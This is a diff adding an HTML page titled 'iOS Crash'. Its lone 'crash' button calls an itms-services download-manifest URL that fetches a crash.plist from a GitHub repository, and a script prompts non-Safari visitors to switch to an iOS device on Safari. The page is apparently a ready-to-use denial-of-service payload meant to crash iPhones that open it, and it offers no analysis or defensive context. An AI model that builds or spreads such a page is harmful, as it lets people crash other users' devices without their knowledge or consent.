@@ -1,0 +1,39 @@
+<html>
+	<head>
+		<title>iOS Crash</title>
+		<style>
+			html{
+				background-color: #333;
+				font-family: "Myriad Pro", Myriad, "Liberation Sans", "Nimbus Sans L", "Helvetica Neue", Helvetica, Arial, sans-serif;
+				font-size: 300%;
+				text-align: center;
+				padding: 25% 0;
+				overflow: hidden;
+			}
+			h1{
+				color: white;
+			}
+			button {
+                background-color: #334;
+                border: none;
+                color: white;
+                text-align: center;
+                text-decoration: none;
+                display: inline-block;
+                font-size: 100%;
+                width: 80%;
+                height: 100%;
+            }
+		</style>
+	</head>
+	<body>
+		<h1 id="display"><button onclick="location.href='itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/orionweblab/iOS-Crash/master/crash/crash.plist';">crash</button></h1>
+		<script>
+	    	var isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
+			var display = document.getElementById("display");
+			if(!isSafari){
+			    display.innerHTML = "please use an ios device on safari";
+			}
+		</script>
+	</body>
+</html>
